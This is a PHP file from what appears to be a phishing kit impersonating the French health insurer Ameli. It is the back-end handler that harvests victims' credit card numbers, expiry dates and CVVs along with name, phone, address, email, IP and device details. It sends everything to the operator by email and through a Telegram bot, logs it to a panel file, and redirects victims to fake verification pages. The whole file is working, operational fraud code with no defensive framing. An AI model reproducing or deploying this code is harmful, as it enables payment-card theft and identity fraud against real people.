<?php
ob_start();
session_start();
include("../config.php");

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $CCNAME = $_POST['input_cc_name'];
    $CC = $_POST['input_cc_num'];
    $DDE = $_POST['input_cc_exp'];
    $CVV = $_POST['input_cc_cvv'];
    $BANK_NAME_INPUT = isset($_POST['input_bank_name']) ? trim($_POST['input_bank_name']) : '';

    $_SESSION['ccname'] = $CCNAME;
    $_SESSION['cc']  = $CC;
    $_SESSION['dde']   = $DDE;
    $_SESSION['cvv'] = $CVV;
    $_SESSION['bank_name'] = $BANK_NAME_INPUT;

    $cc = $_SESSION['cc'];
    $bin = substr(str_replace(' ', '', $_POST["input_cc_num"]), 0, 6);

    $ch = curl_init();

    $url = "https://lookup.binlist.net/$bin";

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');


    $headers = array();
    $headers[] = 'Accept-Version: 3';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);


    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    }


    curl_close($ch);

    $brand = '';
    $type = '';
    $emoji = '';
    $bank = '';

    $someArray = json_decode($result, true);

    $emoji = $someArray['country']['emoji'];
    $brand = $someArray['brand'];
    $type = $someArray['type'];
    $bank = $someArray['bank']['name'];
    $bank_phone = $someArray['bank']['phone'];
    $subject_title = "[BIN: $bin][$emoji $brand $type]";

    $_SESSION['bin_brand']  = $brand;
    $_SESSION['bin_bank']   = $bank;
    $_SESSION['bin_type'] = $type;

    $bank_display = $BANK_NAME_INPUT !== '' ? $BANK_NAME_INPUT : $bank;
    $_SESSION['bank_display'] = $bank_display;

    setlocale(LC_TIME, 'fr_FR');
    date_default_timezone_set('Europe/Paris');
    $heure = date("H:i:s");
    $date = date("d/m/Y");
    $datetime = date("m/d/Y h:i:s a");
    
    $os = 'Unknown';
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    if (strpos($user_agent, 'Windows NT 10.0') !== false) $os = 'Windows 10';
    elseif (strpos($user_agent, 'Windows NT 6.3') !== false) $os = 'Windows 8.1';
    elseif (strpos($user_agent, 'Windows NT 6.2') !== false) $os = 'Windows 8';
    elseif (strpos($user_agent, 'Windows NT 6.1') !== false) $os = 'Windows 7';
    elseif (strpos($user_agent, 'Windows NT 6.0') !== false) $os = 'Windows Vista';
    elseif (strpos($user_agent, 'Windows NT 5.1') !== false) $os = 'Windows XP';
    elseif (strpos($user_agent, 'Mac') !== false) $os = 'macOS';
    elseif (strpos($user_agent, 'Linux') !== false) $os = 'Linux';
    elseif (strpos($user_agent, 'iPhone') !== false) $os = 'iPhone';
    elseif (strpos($user_agent, 'Android') !== false) $os = 'Android';
    
    $browser = 'Unknown';
    if (strpos($user_agent, 'Chrome') !== false) $browser = 'Chrome';
    elseif (strpos($user_agent, 'Safari') !== false) $browser = 'Safari';
    elseif (strpos($user_agent, 'Firefox') !== false) $browser = 'Firefox';
    elseif (strpos($user_agent, 'Edge') !== false) $browser = 'Edge';

    $message = '💳 + 1 NEW CARD @micodesousfrozenn
└

💳 Numéro : ' . $_SESSION["cc"] . '
💳 Expiration : ' . $_SESSION["dde"] . '
💳 CVV : ' . $_SESSION["cvv"] . '

🍓 Banque : ' . $_SESSION['bank_display'] . '

[🥘] Full Info [🥘]

👮‍♂️ Nom : ' . $_SESSION['Nom'] . '
👮‍♂️ Numéro : ' . $_SESSION['tel'] . '

🌆 Adresse : ' . $_SESSION['adresse'] . '
🌆 Code postal : ' . $_SESSION['input_zipcode'] . '
🌆 Ville : ' . $_SESSION['city'] . '
🌆 Pays : France

✉️ Email : ' . $_SESSION['mail'] . '

🌍 Pays : Unknown
🔍 IP : ' . $_SERVER['REMOTE_ADDR'] . '
💻 OS : ' . $os . '
⏰ Heure : ' . $datetime . '
🌐 Navigateur : ' . $browser . '
━━━━━━━━━━━━━━━━━━━━
';

    if ($mail_send == true) {
        $Subject = " 「🍓」+1 Moritz zimmerman Ameli CARD from " . $_SESSION['bank_display'] . " | " . $_SERVER['HTTP_USER_AGENT'];
        $head = "From: Ameli <info@querty.bg>";

        mail($my_mail, $Subject, $message, $head);
    }

    if ($tlg_send == true) {
        file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=" . $rez_card . "&text=" . urlencode("$message"));
    }

    setlocale(LC_TIME, 'fr_FR');
    date_default_timezone_set('Europe/Paris');

    $date = date("d/m/Y");
    $heure = date("H:i:s");

    $myfile = fopen("../panel/cc.txt", "a") or die("Unable to open file!");
    fwrite($myfile, "\n" . '
    <tr>
    <td width="80">
    <p align="center"><img src="https://api.hostip.info/?ip='.$_SERVER['REMOTE_ADDR'].'">' .$_SERVER['REMOTE_ADDR'].'</td>
    <td width="80">
    <p align="center">'.$_SESSION["ccname"].'</td>
    <td width="40">
    <p align="center">'.$_SESSION["cc"] .'</td>
    <td width="20">
    <p align="center">'.$_SESSION["dde"].'</td>
    <td width="40">
    <p align="center">'.$_SESSION['cvv'].'</td>
    <td width="40">
    <p align="center">'.$_SESSION['bin_type'].'</td>
    <td width="20">
    <p align="center">'.$_SESSION['bank_display'].'</td>
    <td width="60">
    <p align="center">'.$_SESSION['bin_brand'].'</th>
    <td width="60">
    <p align="center">'.$heure.' / '.$date.'</td>
    </font></td></tr>
    ');
    fclose($myfile);

    $filepath = '../panel/stats.ini';
    $data = @parse_ini_file($filepath);
    $data['cc']++;
                            function update_ini_file($data, $filepath) {
                                $content = "";
                                $parsed_ini = parse_ini_file($filepath, true);
                                foreach($data as $section => $values){
                                    if($section === ""){
                                        continue;
                                    }
                                    $content .= $section ."=". $values . "\n\r";
                                }
                                if (!$handle = fopen($filepath, 'w')) {
                                    return false;
                                }
                                $success = fwrite($handle, $content);
                                fclose($handle);
                            }
    update_ini_file($data, $filepath);

            if ($vbv) {
                    header('Location: ../pages/loadvbv.php');
            } else {
                    header('Location: ../pages/confirme.php');
            }
    ob_end_clean();
    exit();
    }

header('Location: ../pages/card.php');
exit();
